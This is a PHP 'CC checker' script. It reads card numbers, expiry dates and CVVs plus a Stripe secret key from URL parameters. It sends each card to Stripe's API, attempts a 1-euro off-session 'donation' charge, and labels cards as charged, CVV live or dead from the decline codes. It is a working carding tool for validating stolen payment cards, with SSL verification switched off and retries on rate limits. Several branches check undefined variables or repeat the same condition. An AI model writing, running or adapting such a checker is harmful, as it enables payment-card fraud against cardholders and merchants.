<?php

error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}

function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };

$idd = $_GET['idd'];
$cst = $_GET['cst'];
if(empty($amt)) {
	$amt = '1';
	$chr = $amt * 100;
}
$sk = $_GET['sec'];
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

//================= [ CURL REQUESTS ] =================//

#-------------------[1st REQ]--------------------#
$x = 0;  

while(true)  

{  

$ch = curl_init();  

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  

curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  

curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');  

$result1 = curl_exec($ch);  

$tok1 = Getstr($result1,'"id": "','"');  

$msg = Getstr($result1,'"message": "','"');  

if (strpos($result1, "rate_limit"))   

{  

    $x++;  

    continue;  

}  

break;  

}

#-------------------[2nd REQ]--------------------#

$x = 0;  

while(true)  

{  

$ch = curl_init();  

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  

curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  

curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  

curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=eur&payment_method_types[]=card&description=Star+Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  

$result2 = curl_exec($ch);  

$tok2 = Getstr($result2,'"id": "','"');  

$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  

if (strpos($result2, "rate_limit"))   

{  

    $x++;  

    continue;  

}  

break;  

}


//=================== [ RESPONSES ] ===================//

if(strpos($result2, '"seller_message": "Payment complete."' )) {
   
    echo '#CHARGED</span>  </span>CC - '.$lista.'</span>  <br>RESULT - $1 CVV CHARGED<br>RECIEPT - <a href='.$receipturl.'>HERE</a><br>';
}
elseif(strpos($result2,'"cvc_check": "pass"')){
    echo '#CVV</span>  </span>CC - '.$lista.'</span>  <br>RESULT - CVV LIVE</span><br>';
}

elseif(strpos($result1, "generic_decline")) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - GENERIC DECLINED</span><br>';
    }
elseif(strpos($result2, "generic_decline" )) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - GENERIC DECLINED</span><br>';
}
elseif(strpos($result2, "insufficient_funds" )) {
    echo '#CVV</span>  </span>CC - '.$lista.'</span>  <br>RESULT - INSUFFICIENT FUNDS</span><br>';
}

elseif(strpos($result2, "fraudulent" )) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - FRAUDULENT</span><br>';
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - DO NOT HONOR</span><br>';
    }
elseif(strpos($resul2, "do_not_honor" )) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - DO NOT HONOR</span><br>';
}
elseif(strpos($result,"fraudulent")){
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - FRAUDULENT</span><br>';

}

elseif(strpos($result2,'"code": "incorrect_cvc"')){
    echo '#CCN</span>  </span>CC - '.$lista.'</span>  <br>RESULT - SECURITY CODE IS INCORRECT</span><br>';
}
elseif(strpos($result1,' "code": "invalid_cvc"')){
    echo '#CCN</span>  </span>CC - '.$lista.'</span>  <br>RESULT - SECURITY CODE IS INCORRECT</span><br>';
     
}
elseif(strpos($result1,"invalid_expiry_month")){
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - INVAILD EXPIRY MONTH</span><br>';

}
elseif(strpos($result2,"invalid_account")){
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - INVAILD ACCOUNT</span><br>';

}

elseif(strpos($result2, "do_not_honor")) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - DO NOT HONOR</span><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - LOST CARD</span><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - LOST CARD</span></span>  <br>RESULT - CHECKER BY checker</span> <br>';
}

elseif(strpos($result2, "stolen_card" )) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - STOLEN CARD</span><br>';
    }

elseif(strpos($result2, "stolen_card" )) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - STOLEN CARD</span><br>';

}
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo '#CVV</span>  </span>CC - '.$lista.'</span>  <br>RESULT - TRANSACTION NOT ALLOWED</span><br>';
    }
    elseif(strpos($result2, "authentication_required")) {
    	echo '#CVV</span>  </span>CC - '.$lista.'</span>  <br>RESULT - 32DS REQUIRED</span><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    	echo '#CVV</span>  </span>CC - '.$lista.'</span>  <br>RESULT - 32DS REQUIRED</span><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    	echo '#CVV</span>  </span>CC - '.$lista.'</span>  <br>RESULT - 32DS REQUIRED</span><br>';
   } 
   elseif(strpos($result1, "card_error_authentication_required")) {
    	echo '#CVV</span>  </span>CC - '.$lista.'</span>  <br>RESULT - 32DS REQUIRED</span><br>';
   } 
elseif(strpos($result2, "incorrect_cvc" )) {
    echo '#CCN</span>  </span>CC - '.$lista.'</span>  <br>RESULT - Security code is incorrect</span><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - PICKUP CARD</span><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - PICKUP CARD</span><br>';

}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - EXPIRED CARD</span><br>';
}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - EXPIRED CARD</span><br>';

}
elseif(strpos($result2, "card_decline_rate_limit_exceeded")) {
	echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - RATE LIMIT</span><br>';
}
elseif(strpos($result2, '"code": "processing_error"')) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - PROCESSING ERROR</span><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - YOUR CARD NUMBER IS INCORRECT</span><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - SERVICE NOT ALLOWED</span><br>';
    }
elseif(strpos($result2, '"code": "processing_error"')) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - PROCESSING ERROR</span><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - YOUR CARD NUMBER IS INCORRECT</span><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - SERVICE NOT ALLOWED</span><br>';

}
elseif(strpos($result, "incorrect_number")) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - INCORRECT CARD NUMBER</span><br>';
}
elseif(strpos($result1, "incorrect_number")) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - INCORRECT CARD NUMBER</span><br>';


}elseif(strpos($result1, "do_not_honor")) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - DO NOT HONOR</span><br>';

}
elseif(strpos($result1, 'Your card was declined.')) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - CARD DECLINED</span><br>';

}
elseif(strpos($result1, "do_not_honor")) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - DO NOT HONOR</span><br>';
    }
elseif(strpos($result2, "generic_decline")) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - GENERIC CARD</span><br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - CARD DECLINED</span><br>';

}
elseif(strpos($result2,' "decline_code": "do_not_honor"')){
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - DO NOT HONOR</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - CVC_UNCHECKED : INFORM AT OWNER</span><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - CVC_CHECK : FAIL</span><br>';
}
elseif(strpos($result2, "card_not_supported")) {
	echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - CARD NOT SUPPORTED</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - CVC_CHECK : UNVAILABLE</span><br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - CVC_UNCHECKED : INFORM TO OWNER」</span><br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - CVC_CHECKED : FAIL</span><br>';
}
elseif(strpos($result2,"currency_not_supported")) {
	echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - CURRENCY NOT SUPORTED TRY IN INR</span><br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '#DEAD</span> CC - '.$lista.'</span>  <br>RESULT - CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
    }

elseif(strpos($result2,'"cvc_check": "pass"')){
    echo '#CVV</span>  </span>CC - '.$lista.'</span>  <br>RESULT - CVV LIVE</span><br>';
}
elseif(strpos($result2, "fraudulent" )) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - FRAUDULENT</span><br>';
}
elseif(strpos($result1, "testmode_charges_only" )) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - INVALID SECRET</span><br>';
}
elseif(strpos($result1, "api_key_expired" )) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - INVALID SECRET</span><br>';
}
elseif(strpos($result1, "parameter_invalid_empty" )) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - ENTER CC TO CHECK</span><br>';
}
elseif(strpos($result1, "card_not_supported" )) {
    echo '#DEAD</span>  </span>CC - '.$lista.'</span>  <br>RESULT - CARD NOT SUPPORTED</span><br>';
}
else {
    echo '#DEAD</span> CC - '.$lista.'</span>  <br>RESULT - BAD REQUEST</span><br>';
   
   
      
}

curl_close($ch);
ob_flush();
?>